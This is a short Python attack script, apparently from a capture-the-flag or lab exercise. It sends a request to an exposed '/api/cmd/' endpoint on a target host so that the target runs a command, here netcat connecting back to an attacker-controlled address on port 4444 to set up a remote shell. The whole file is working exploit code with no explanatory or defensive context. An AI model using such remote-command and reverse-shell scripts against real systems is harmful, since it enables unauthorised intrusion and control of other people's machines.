#!/usr/bin/env python3

import requests as r
import json

IP = "10.10.43.0"
COMMAND = "nc+10.8.110.17+4444"
URL = "http://{}:3000/api/cmd/{}".format(IP, COMMAND)

response = r.get(URL)
resp = json.loads(response.text)
print(resp["stdout"])